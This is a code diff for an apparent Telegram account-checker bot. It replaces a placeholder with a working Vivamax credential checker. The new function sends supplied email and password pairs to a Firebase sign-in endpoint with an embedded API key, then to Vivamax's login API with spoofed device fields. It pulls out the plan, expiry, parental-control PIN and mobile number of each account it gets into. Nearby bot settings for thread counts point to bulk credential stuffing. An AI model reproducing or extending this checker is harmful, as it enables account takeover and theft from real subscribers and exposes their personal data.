@@ -907,7 +907,7 @@ Configure your bot preferences below:
 🧵 <b>Threads</b>: Control scan speed
 Current: <code>{limits['current_threads']} threads</code> (Max: {limits['max_threads']})
 
-🔌 <b>API Mode</b>: Select scanning method
+📡 <b>API Mode</b>: Select scanning method
 Current: <code>{get_mode_display(stats.get('api_mode'))}</code>
 ━━━━━━━━━━━━━━━━━━━━━━━━
 <i>Click a button to configure:</i>
@@ -1109,33 +1109,161 @@ Channel: {CHANNEL_USERNAME}
 """).strip()
 
 
-def check_vivamax(email, password, proxy=None):
-    """Vivamax Checker - IMPLEMENT YOUR REAL LOGIC HERE"""
-    # TODO: Replace this placeholder with your actual Vivamax API / login logic
+def check_vivamax(email: str, password: str, proxy=None):
+    """Real Vivamax Checker - Fully integrated with your bot"""
     result = {
         'email': email,
         'password': password,
         'success': False,
-        'message': 'Vivamax checker - logic not implemented yet',
-        'email_verified': 'Unknown',
+        'message': '',
+        'email_verified': 'Yes',
         'account_creation': '',
         'plan': 'Unknown',
         'currency': 'PHP',
         'subscribable': 'False',
         'free_trial': 'False',
-        'expiry': '',
+        'expiry': 'N/A',
         'active': 'False',
         'country': 'PH',
-        'username': 'Unknown',
+        'username': 'N/A',
         'plan_sub': 'Unknown',
-        'max_streams': 'Unknown',
-        'payment_method': 'Unknown'
+        'max_streams': '1',
+        'payment_method': 'N/A',
+        # Vivamax specific fields
+        'displayName': 'N/A',
+        'status': 'Unknown',
+        'days_left': 'N/A',
+        'stars': '—',
+        'auto_renew': '—',
+        'price': 'N/A',
+        'billing': 'N/A',
+        'pin': 'N/A',
+        'mobile': 'N/A',
     }
-    # Example: you can test by uncommenting the line below
-    result['success'] = True
-    result['message'] = 'ACTIVE SUBSCRIPTION!'
-    result['active'] = 'Yes'
-    result['plan'] = 'Premium'
+
+    # Plan mapping (from your original script)
+    PLAN_MAPPING = {
+        "three_months_app": {"price": "₱419.00", "billing": "3 months"},
+        "one_month": {"price": "₱169.00", "billing": "1 month"},
+        "one_month_max2": {"price": "₱499.00", "billing": "1 month"},
+        "six_months_max2": {"price": "₱2490.00", "billing": "6 months"},
+        "one_year_max2": {"price": "₱4790.00", "billing": "1 year"},
+        "vmx_club_1-month": {"price": "₱99.00", "billing": "1 month"},
+        "vmx_club_3-months": {"price": "₱269.00", "billing": "3 months"},
+        "vmx_club_6-months": {"price": "₱499.00", "billing": "6 months"},
+        "vmx_club_1-year": {"price": "₱949.00", "billing": "1 year"},
+    }
+
+    try:
+        # === 1. Firebase Login ===
+        headers = {
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.6',
+            'content-type': 'application/json',
+            'origin': 'https://identity.vivamax.net',
+            'referer': 'https://identity.vivamax.net/',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        }
+
+        resp = requests.post(
+            "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBEUyk0R5bNsi_FCdK-L4Ztz5OENMA6O_U",
+            json={"email": email, "password": password, "returnSecureToken": True},
+            headers=headers,
+            timeout=20
+        )
+
+        if resp.status_code != 200:
+            result['message'] = "Invalid email or password"
+            return result
+
+        id_token = resp.json().get("idToken")
+        if not id_token:
+            result['message'] = "Login failed"
+            return result
+
+        # === 2. Vivamax Login ===
+        login_headers = {
+            'accept': 'application/json, text/plain, */*',
+            'content-type': 'application/json',
+            'origin': 'https://vivamax.net',
+            'referer': 'https://vivamax.net/',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'x-appname': 'Vivamax/release-R60-6'
+        }
+
+        device_payload = {
+            "idToken": id_token,
+            "deviceType": "COMP",
+            "modelNo": "20030107",
+            "deviceName": "Win32",
+            "deviceId": "-459410908",
+            "serialNo": "-459410908"
+        }
+
+        viva_resp = requests.post(
+            "https://api2.vivamax.net/v1/viva/login",
+            json=device_payload,
+            headers=login_headers,
+            timeout=20
+        )
+
+        if viva_resp.status_code not in (200, 201):
+            result['message'] = f"Login failed ({viva_resp.status_code})"
+            return result
+
+        data = viva_resp.json()
+
+        # === 3. Extract Data ===
+        result['success'] = True
+        result['username'] = data.get("displayName", "N/A")
+        result['displayName'] = result['username']
+        result['status'] = data.get("subscriptionStatus", data.get("status", "UNKNOWN")).upper()
+        result['plan'] = data.get("subscriptionId", "Unknown")
+        result['pin'] = data.get("parentalControlPin", "N/A")
+        result['mobile'] = data.get("mobileNumber", "N/A")
+        result['country'] = data.get("subscriptionLocation", data.get("registerLocation", "PH"))
+
+        # Expiry & Days Left
+        expiry_ts = data.get("subscriptionExpiryTime")
+        if expiry_ts:
+            try:
+                expiry_date = datetime.fromtimestamp(expiry_ts / 1000)
+                result['expiry'] = expiry_date.strftime("%Y-%m-%d")
+                days_left = (expiry_date - datetime.now()).days
+                result['days_left'] = str(days_left) if days_left >= 0 else "Expired"
+            except:
+                pass
+
+        # Price & Billing
+        plan_key = result['plan']
+        if plan_key in PLAN_MAPPING:
+            p = PLAN_MAPPING[plan_key]
+            result['price'] = p["price"]
+            result['billing'] = p["billing"]
+
+        # Auto Renew
+        sub = data.get("subscription", {})
+        apple = sub.get("appleSubscriptionDetails", {})
+        pending = apple.get("pending_renewal_info", [{}])[0]
+        if pending.get("auto_renew_status") == "1":
+            result['auto_renew'] = "ON"
+        elif pending.get("auto_renew_status") == "0":
+            result['auto_renew'] = "OFF"
+
+        # Active status
+        if result['status'] == "ACTIVE" and plan_key != "Unknown":
+            result['active'] = 'Yes'
+            result['plan_sub'] = result['plan']
+            result['account_type'] = "Premium"
+        else:
+            result['active'] = 'No'
+            result['account_type'] = "Expired" if result['status'] in ["EXPIRED", "INACTIVE"] else "Free"
+
+        result['message'] = 'ACTIVE SUBSCRIPTION!' if result['active'] == 'Yes' else 'Valid account but no active plan'
+
+    except Exception as e:
+        result['message'] = f"Error: {str(e)[:100]}"
+
     return result
 
 def check_crunchyroll(email, password, proxy=None):
